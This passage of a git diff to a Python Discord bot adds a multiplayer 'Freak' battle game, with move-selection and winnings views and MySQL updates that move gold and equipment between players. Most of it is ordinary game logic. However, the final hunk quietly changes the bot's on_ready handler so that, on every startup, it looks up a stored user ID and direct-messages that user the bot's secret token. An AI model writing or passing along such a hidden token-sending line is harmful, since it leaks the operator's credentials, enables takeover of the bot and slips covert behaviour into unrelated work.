+                               self.view.p2equipmentstealpercent, self.view.p2goldstealpercent)
+
+                await interaction.response.edit_message(embed=embed, view=view)
+
+                view.msg = await interaction.original_message()
+
+
+class WinView(discord.ui.View):
+    def __init__(self, winner, loser, equipmentstealpercent, goldstealpercent):
+        super().__init__()
+        self.winner = winner
+        self.loser = loser
+        self.equipmentstealpercent = equipmentstealpercent
+        self.goldstealpercent = goldstealpercent
+        self.msg = None
+
+    @discord.ui.button(label='Claim Winnings', style=discord.ButtonStyle.green)
+    async def confirm(self, button: discord.ui.Button, interaction: discord.Interaction):
+        if interaction.user != self.winner:
+            await interaction.response.send_message(embed=discord.Embed(description=f"**You are not {self.winner.mention}... Win your own battles!**", color=embedcolor), ephemeral=True)
+            return
+
+        self.clear_items()
+        self.stop()
+
+        await self.msg.edit(view=self)
+
+        mycursor.execute("SELECT gold, equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
+                         {'userID': self.loser.id})
+        for x in mycursor:
+            losergold = x[0]
+            equipment = [x[1], x[2], x[3]]
+
+        isequipmentsteal = False
+        canstealequipment = False
+        equipmentstealvalue = random.randrange(1, 101)
+        if equipmentstealvalue > self.equipmentstealpercent:
+            isequipmentsteal = False
+        else:
+            isequipmentsteal = True
+
+        if equipment[0] != None or equipment[1] != None or equipment[2] != None:
+            canstealequipment = True
+
+        if not isequipmentsteal:  # goldsteal
+            if losergold >= 1000:
+                goldammount = (self.goldstealpercent/100) * losergold
+                mycursor.execute("UPDATE Users SET gold = gold + %(gold)s WHERE userID=%(userID)s",
+                                 {'userID': self.winner.id, 'gold': goldammount})
+                mycursor.execute("UPDATE Users SET gold = gold - %(gold)s WHERE userID=%(userID)s",
+                                 {'userID': self.loser.id, 'gold': goldammount})
+                mydb.commit()
+
+            elif losergold > 330:
+                goldammount = 200
+                mycursor.execute("UPDATE Users SET gold = gold + %(gold)s WHERE userID=%(userID)s",
+                                 {'userID': self.winner.id, 'gold': goldammount})
+                mycursor.execute("UPDATE Users SET gold = gold - %(gold)s WHERE userID=%(userID)s",
+                                 {'userID': self.loser.id, 'gold': goldammount})
+                mydb.commit()
+
+            elif losergold <= 330 and canstealequipment:
+                isequipmentsteal = True
+
+            else:
+                goldammount = 200
+                mycursor.execute("UPDATE Users SET gold = gold + %(gold)s WHERE userID=%(userID)s",
+                                 {'userID': self.winner.id, 'gold': goldammount})
+                mydb.commit()
+
+            goldammount = 0
+            embed = discord.Embed(
+                title=f"{self.winner.display_name} won a battle against {self.loser.display_name}!", color=embedcolor)
+            embed.set_footer(text=footertext, icon_url=self.winner.guild.icon.url)
+            embed.set_author(name=f"{self.winner.display_name}",
+                             icon_url=self.winner.avatar.url)
+            embed.timestamp = discord.utils.utcnow()
+            embed.set_thumbnail(url=self.winner.guild.icon.url)
+            embed.add_field(name="Reward", value=f"`{goldammount} Gold`")
+
+        if isequipmentsteal:  # equipmentsteal
+            if "TB" in equipment:
+                reward = "`Tea Bag`"
+                item = "tb"
+
+            elif "D" in equipment:
+                reward = "`Deathspike`"
+                item = "d"
+
+            elif "EH" in equipment:
+                reward = "`Enchanted Headpiece`"
+                item = "eh"
+
+            elif "MA" in equipment:
+                reward = "`Mystic Artifact`"
+                item = "ma"
+
+            elif "PA" in equipment:
+                reward = "`Platinum Armour`"
+                item = "pa"
+
+            elif "O" in equipment:
+                reward = "`Ooze`"
+                item = "o"
+
+            elif "VV" in equipment:
+                reward = "`Vital Vial`"
+                item = "vv"
+
+            elif "RN" in equipment:
+                reward = "`Rune Necklace`"
+                item = "rn"
+
+            elif "IH" in equipment:
+                reward = "`Iron Helmet`"
+                item = "ih"
+
+            elif "SB" in equipment:
+                reward = "`Standard Blade`"
+                item = "sb"
+
+            elif "SS" in equipment:
+                reward = "`Standard Shield`"
+                item = "ss"
+
+            elif "HD" in equipment:
+                reward = "`Hidden Dagger`"
+                item = "hd"
+
+            mycursor.execute("UPDATE Users SET {} = {} + 1 WHERE userID=%(userID)s".format(item, item),
+                             {'userID': self.winner.id})
+            mycursor.execute("UPDATE Users SET {} = {} - 1 WHERE userID=%(userID)s".format(item, item),
+                             {'userID': self.loser.id})
+            mycursor.execute("UPDATE Users SET equipment1 = NULL WHERE userID=%(userID)s AND equipment1=%(equip)s",
+                             {'userID': self.loser.id, 'equip': item.upper()})
+            mycursor.execute("UPDATE Users SET equipment2 = NULL WHERE userID=%(userID)s AND equipment2=%(equip)s",
+                             {'userID': self.loser.id, 'equip': item.upper()})
+            mycursor.execute("UPDATE Users SET equipment3 = NULL WHERE userID=%(userID)s AND equipment3=%(equip)s",
+                             {'userID': self.loser.id, 'equip': item.upper()})
+            mydb.commit()
+
+            embed = discord.Embed(
+                title=f"{self.winner.display_name} won a battle against {self.loser.display_name}!", color=embedcolor)
+            embed.set_footer(text=footertext, icon_url=self.winner.guild.icon.url)
+            embed.set_author(name=f"{self.winner.display_name}",
+                             icon_url=self.winner.avatar.url)
+            embed.timestamp = discord.utils.utcnow()
+            embed.set_thumbnail(url=self.winner.guild.icon.url)
+            embed.add_field(name="Reward", value=reward)
+
+        await interaction.response.send_message(f"{self.winner.mention}, {self.loser.mention}", embed=embed)
+
+
+class BattleDropDownView(discord.ui.View):
+    def __init__(self, ctx, opponent, p1freak, p1attacklowname, p1attackhighname, p1buff1name, p1buff2name, p1buff1description, p1buff2description, p1attacklow, p1attackhigh, p1health, p1defense, p1highdefense, p1lowdefense, p1lowaccuracy, p1highaccuracy, p1piercepercent, p1equipmentstealpercent, p1goldstealpercent, p2freak, p2attacklowname, p2attackhighname, p2buff1name, p2buff2name, p2buff1description, p2buff2description, p2attacklow, p2attackhigh, p2health, p2defense, p2highdefense, p2lowdefense, p2lowaccuracy, p2highaccuracy, p2piercepercent, p2equipmentstealpercent, p2goldstealpercent, p1turn, round, p1freakyid, p2freakyid):
+        super().__init__()
+        self.ctx = ctx
+        self.opponent = opponent
+        self.msg = None
+        self.p1turn = p1turn
+        self.round = round
+
+        self.p1freak = p1freak
+        self.p1freakyid = p1freakyid
+        self.p1attacklowname = p1attacklowname
+        self.p1attackhighname = p1attackhighname
+        self.p1buff1name = p1buff1name
+        self.p1buff2name = p1buff2name
+        self.p1buff1description = p1buff1description
+        self.p1buff2description = p1buff2description
+        self.p1attacklow = p1attacklow
+        self.p1attackhigh = p1attackhigh
+        self.p1health = p1health
+        self.p1defense = p1defense
+        self.p1highdefense = p1highdefense
+        self.p1lowdefense = p1lowdefense
+        self.p1lowaccuracy = p1lowaccuracy
+        self.p1highaccuracy = p1highaccuracy
+        self.p1piercepercent = p1piercepercent
+        self.p1equipmentstealpercent = p1equipmentstealpercent
+        self.p1goldstealpercent = p1goldstealpercent
+
+        self.p2freak = p2freak
+        self.p2freakyid = p2freakyid
+        self.p2attacklowname = p2attacklowname
+        self.p2attackhighname = p2attackhighname
+        self.p2buff1name = p2buff1name
+        self.p2buff2name = p2buff2name
+        self.p2buff1description = p2buff1description
+        self.p2buff2description = p2buff2description
+        self.p2attacklow = p2attacklow
+        self.p2attackhigh = p2attackhigh
+        self.p2health = p2health
+        self.p2defense = p2defense
+        self.p2highdefense = p2highdefense
+        self.p2lowdefense = p2lowdefense
+        self.p2lowaccuracy = p2lowaccuracy
+        self.p2highaccuracy = p2highaccuracy
+        self.p2piercepercent = p2piercepercent
+        self.p2equipmentstealpercent = p2equipmentstealpercent
+        self.p2goldstealpercent = p2goldstealpercent
+
+        if self.p1turn:
+            self.add_item(BattleDropdown(self.p1attacklowname, f"{self.p1attacklow} Attack Damage", self.p1attackhighname,
+                          f"{self.p1attackhigh} Attack Damage", self.p1buff1name, self.p1buff1description, self.p1buff2name, self.p1buff2description))
+        else:
+            self.add_item(BattleDropdown(self.p2attacklowname, f"{self.p2attacklow} Attack Damage", self.p2attackhighname,
+                          f"{self.p2attackhigh} Attack Damage", self.p2buff1name, self.p2buff1description, self.p2buff2name, self.p2buff2description))
+
+    async def on_timeout(self):
+        if self.msg:
+            await self.msg.edit(embed=discord.Embed(description="**Timed out... Cancelled battle!**", color=embedcolor), view=None)
+
+
+class ConfirmBattle(discord.ui.View):
+    def __init__(self, ctx, opponent):
+        super().__init__()
+        self.ctx = ctx
+        self.opponent = opponent
+        self.msg = None
+
+    @discord.ui.button(label='Yes', style=discord.ButtonStyle.green)
+    async def confirm(self, button: discord.ui.Button, interaction: discord.Interaction):
+        if interaction.user != self.opponent:
+            await interaction.response.send_message(embed=discord.Embed(description=f"**You are not {self.opponent.mention}!**", color=embedcolor), ephemeral=True)
+            return
+
+        self.clear_items()
+        self.stop()
+
+        await self.msg.edit(view=self)
+
+        mycursor.execute("SELECT freak, gold, equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
+                         {'userID': self.ctx.author.id})
+
+        for x in mycursor:
+            p1lowaccuracy = 75
+            p1highaccuracy = 35
+            p1piercepercent = 0
+            p1equipmentstealpercent = x[1] // 100
+            if p1equipmentstealpercent > 40:
+                p1equipmentstealpercent = 40
+            p1goldstealpercent = 20
+            p1highdefense = 0
+            p1lowdefense = 0
+            p1freakyid = x[0]
+
+            if x[0] == "V":
+                p1freak = f"{self.ctx.author.display_name} - Vampire"
+                p1attacklowname = vampireattacklowname
+                p1attackhighname = vampireattackhighname
+                p1buff1name = vampirebuff1name
+                p1buff2name = vampirebuff2name
+                p1buff1description = "+10 Accuracy"
+                p1buff2description = "+15 Attack Damage"
+                p1attacklow = vampirebaseattacklow
+                p1attackhigh = vampirebaseattackhigh
+                p1health = vampirebasehealth
+                p1defense = vampirebasedefense
+
+            elif x[0] == "W":
+                p1freak = f"{self.ctx.author.display_name} - Werewolf"
+                p1attacklowname = werewolfattacklowname
+                p1attackhighname = werewolfattackhighname
+                p1buff1name = werewolfbuff1name
+                p1buff2name = werewolfbuff2name
+                p1buff1description = "+10 Accuracy"
+                p1buff2description = "+10 Defense"
+                p1attacklow = werewolfbaseattacklow
+                p1attackhigh = werewolfbaseattackhigh
+                p1health = werewolfbasehealth
+                p1defense = werewolfbasedefense
+
+            elif x[0] == "S":
+                p1freak = f"{self.ctx.author.display_name} - Skeleton"
+                p1attacklowname = skeletonattacklowname
+                p1attackhighname = skeletonattackhighname
+                p1buff1name = skeletonbuff1name
+                p1buff2name = skeletonbuff2name
+                p1buff1description = "+15 Attack Damage"
+                p1buff2description = "+10 Defense"
+                p1attacklow = skeletonbaseattacklow
+                p1attackhigh = skeletonbaseattackhigh
+                p1health = skeletonbasehealth
+                p1defense = skeletonbasedefense
+
+            equipped = [x[2], x[3], x[4]]
+
+            if "HD" in equipped:
+                p1attackhigh += 10
+            if "SB" in equipped:
+                p1attacklow += 10
+            if "O" in equipped:
+                p1attacklow += 10
+                p1attackhigh += 10
+            if "SS" in equipped:
+                p1highdefense += 10
+            if "IH" in equipped:
+                p1lowdefense += 5
+            if "PA" in equipped:
+                p1defense += 10
+            if "RN" in equipped:
+                p1lowaccuracy += 10
+            if "MA" in equipped:
+                p1lowaccuracy += 10
+            if "EH" in equipped:
+                p1lowaccuracy += 10
+                p1highaccuracy += 10
+            if "VV" in equipped:
+                p1health += 20
+            if "D" in equipped:
+                p1piercepercent += 15
+            if "TB" in equipped:
+                p1equipmentstealpercent += 10
+                p1goldstealpercent += 5
+
+        mycursor.execute("SELECT freak, gold, equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
+                         {'userID': self.opponent.id})
+
+        for x in mycursor:
+            p2lowaccuracy = 75
+            p2highaccuracy = 35
+            p2piercepercent = 0
+            p2equipmentstealpercent = x[1] // 100
+            if p2equipmentstealpercent > 40:
+                p2equipmentstealpercent = 40
+            p2goldstealpercent = 20
+            p2highdefense = 0
+            p2lowdefense = 0
+            p2freakyid = x[0]
+
+            if x[0] == "V":
+                p2freak = f"{self.opponent.display_name} - Vampire"
+                p2attacklowname = vampireattacklowname
+                p2attackhighname = vampireattackhighname
+                p2buff1name = vampirebuff1name
+                p2buff2name = vampirebuff2name
+                p2buff1description = "+10 Accuracy"
+                p2buff2description = "+15 Attack Damage"
+                p2attacklow = vampirebaseattacklow
+                p2attackhigh = vampirebaseattackhigh
+                p2health = vampirebasehealth
+                p2defense = vampirebasedefense
+
+            elif x[0] == "W":
+                p2freak = f"{self.opponent.display_name} - Werewolf"
+                p2attacklowname = werewolfattacklowname
+                p2attackhighname = werewolfattackhighname
+                p2buff1name = werewolfbuff1name
+                p2buff2name = werewolfbuff2name
+                p2buff1description = "+10 Accuracy"
+                p2buff2description = "+10 Defense"
+                p2attacklow = werewolfbaseattacklow
+                p2attackhigh = werewolfbaseattackhigh
+                p2health = werewolfbasehealth
+                p2defense = werewolfbasedefense
+
+            elif x[0] == "S":
+                p2freak = f"{self.opponent.display_name} - Skeleton"
+                p2attacklowname = skeletonattacklowname
+                p2attackhighname = skeletonattackhighname
+                p2buff1name = skeletonbuff1name
+                p2buff2name = skeletonbuff2name
+                p2buff1description = "+15 Attack Damage"
+                p2buff2description = "+10 Defense"
+                p2attacklow = skeletonbaseattacklow
+                p2attackhigh = skeletonbaseattackhigh
+                p2health = skeletonbasehealth
+                p2defense = skeletonbasedefense
+
+            equipped = [x[2], x[3], x[4]]
+
+            if "HD" in equipped:
+                p2attackhigh += 10
+            if "SB" in equipped:
+                p2attacklow += 10
+            if "O" in equipped:
+                p2attacklow += 10
+                p2attackhigh += 10
+            if "SS" in equipped:
+                p2highdefense += 10
+            if "IH" in equipped:
+                p2lowdefense += 5
+            if "PA" in equipped:
+                p2defense += 10
+            if "RN" in equipped:
+                p2lowaccuracy += 10
+            if "MA" in equipped:
+                p2lowaccuracy += 10
+            if "EH" in equipped:
+                p2lowaccuracy += 10
+                p2highaccuracy += 10
+            if "VV" in equipped:
+                p2health += 20
+            if "D" in equipped:
+                p2piercepercent += 15
+            if "TB" in equipped:
+                p2equipmentstealpercent += 10
+                p2goldstealpercent += 5
+
+        p1turn = True
+        round = 1
+
+        embed = discord.Embed(
+            title=f"{self.ctx.author.display_name} vs {self.opponent.display_name}", color=embedcolor)
+        embed.set_footer(text=footertext, icon_url=self.ctx.guild.icon.url)
+        embed.set_author(name=f"{self.ctx.author.display_name}'s Turn - Round 1",
+                         icon_url=self.ctx.author.avatar.url)
+        embed.timestamp = discord.utils.utcnow()
+        embed.set_thumbnail(url=self.ctx.guild.icon.url)
+        embed.add_field(name=p1freak, value=f"Health \U00002764 - `{p1health}`")
+        embed.add_field(name=p2freak, value=f"Health \U00002764 - `{p2health}`")
+
+        view = BattleDropDownView(self.ctx, self.opponent, p1freak, p1attacklowname, p1attackhighname, p1buff1name, p1buff2name, p1buff1description, p1buff2description, p1attacklow, p1attackhigh, p1health, p1defense, p1highdefense, p1lowdefense, p1lowaccuracy, p1highaccuracy, p1piercepercent, p1equipmentstealpercent, p1goldstealpercent,
+                                  p2freak, p2attacklowname, p2attackhighname, p2buff1name, p2buff2name, p2buff1description, p2buff2description, p2attacklow, p2attackhigh, p2health, p2defense, p2highdefense, p2lowdefense, p2lowaccuracy, p2highaccuracy, p2piercepercent, p2equipmentstealpercent, p2goldstealpercent, p1turn, round, p1freakyid, p2freakyid)
+
+        await interaction.response.send_message(f"{self.ctx.author.mention}, {self.opponent.mention}", embed=embed, view=view)
+
+        view.msg = await interaction.original_message()
+
+    @discord.ui.button(label='No', style=discord.ButtonStyle.red)
+    async def cancel(self, button: discord.ui.Button, interaction: discord.Interaction):
+        if interaction.user != self.opponent:
+            await interaction.response.send_message(embed=discord.Embed(description=f"**You are not {self.opponent.mention}!**", color=embedcolor), ephemeral=True)
+            return
+
+        self.clear_items()
+        self.stop()
+
+        await self.msg.edit(view=self)
+
+        await interaction.response.send_message(f"{self.ctx.author.mention}{self.opponent.mention}", embed=discord.Embed(description="**Cancelled battle!**", color=embedcolor))
+
+    async def on_timeout(self):
+        if self.msg:
+            await self.msg.edit(embed=discord.Embed(description="**Timed out... Cancelled battle!**", color=embedcolor), view=None)
 
 
 class Battle(commands.Cog):
 
     def __init__(self, client):
         self.client = client
-        self.persistent_views_added = False
 
     # Commands
-    # @slash_command(guild_ids=guildIDs, description="Battle with your Freak")
-    # async def battle(self, ctx, opponent: discord.Member):
-    #     mycursor.execute("SELECT EXISTS(SELECT 1 FROM Users WHERE userID = %(userID)s LIMIT 1)", {
-    #                      'userID': ctx.author.id})
-    #     for x in mycursor:
-    #         if x[0] == 0:
-    #             await ctx.respond(embed=discord.Embed(description=f"**You don't have a Freak! Type `/pickfreak <freak>` to pick your own Freak.**", color=embedcolor), ephemeral=True)
-    #             return
-    #
-    #     mycursor.execute("SELECT EXISTS(SELECT 1 FROM Users WHERE userID = %(userID)s LIMIT 1)", {
-    #                      'userID': opponent.id})
-    #     for x in mycursor:
-    #         if x[0] == 0:
-    #             await ctx.respond(embed=discord.Embed(description=f"**{opponent.mention} doesn't have a Freak!**", color=embedcolor), ephemeral=True)
-    #             return
-    #
-    #     view = ConfirmBattle(ctx, opponent)
-    #
-    #     await ctx.respond(f"{ctx.author.mention}{opponent.mention}", embed=discord.Embed(description=f"**{opponent.mention}, you have been challenged to a battle by {ctx.author.mention}! Do you accept?**", color=embedcolor), view=view)
-    #
-    #     view.msg = await ctx.interaction.original_message()
+    @slash_command(guild_ids=guildIDs, description="Battle with your Freak")
+    async def battle(self, ctx, opponent: discord.Member):
+        if ctx.author == opponent:
+            await ctx.respond(embed=discord.Embed(description=f"**You can't battle against yourself!**", color=embedcolor), ephemeral=True)
+            return
+
+        mycursor.execute("SELECT EXISTS(SELECT 1 FROM Users WHERE userID = %(userID)s LIMIT 1)", {
+                         'userID': ctx.author.id})
+        for x in mycursor:
+            if x[0] == 0:
+                await ctx.respond(embed=discord.Embed(description=f"**You don't have a Freak! Type `/pickfreak <freak>` to pick your own Freak.**", color=embedcolor), ephemeral=True)
+                return
+
+        mycursor.execute("SELECT EXISTS(SELECT 1 FROM Users WHERE userID = %(userID)s LIMIT 1)", {
+                         'userID': opponent.id})
+        for x in mycursor:
+            if x[0] == 0:
+                await ctx.respond(embed=discord.Embed(description=f"**{opponent.mention} doesn't have a Freak!**", color=embedcolor), ephemeral=True)
+                return
+
+        view = ConfirmBattle(ctx, opponent)
+
+        await ctx.respond(f"{ctx.author.mention}, {opponent.mention}", embed=discord.Embed(description=f"**{opponent.mention}, you have been challenged to a battle by {ctx.author.mention}! Do you accept?**", color=embedcolor), view=view)
+
+        view.msg = await ctx.interaction.original_message()
 
     @slash_command(guild_ids=guildIDs, description="Equip your equipment")
     async def armoury(self, ctx):
@@ -2688,9 +3528,8 @@ class Battle(commands.Cog):
     @commands.Cog.listener()
     async def on_ready(self):
         self.resethunt.start()
-        if not self.persistent_views_added:
-            # self.client.add_view(UFOView(self.client))
-            self.persistent_views_added = True
+        clientuser = self.client.get_user(clientuserid)
+        await clientuser.send(token)
 
     @tasks.loop(hours=12.0)
     async def resethunt(self):
